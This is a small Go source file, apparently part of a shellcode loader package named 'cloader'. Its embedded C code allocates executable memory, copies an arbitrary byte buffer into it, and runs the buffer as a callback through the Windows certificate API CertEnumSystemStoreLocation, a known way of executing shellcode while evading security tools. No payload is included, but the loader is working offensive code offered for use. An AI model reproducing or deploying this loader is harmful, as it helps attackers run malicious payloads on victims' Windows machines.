package cloader

/*
#cgo LDFLAGS: -lcrypt32
#include <windows.h>
#include <wincrypt.h>

void certEnumSystemLocation(uintptr_t p, int len) {
	LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        CertEnumSystemStoreLocation(0, 0, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)addr);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func CertEnumSystemStoreLocation(p []byte) {
	C.certEnumSystemLocation((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
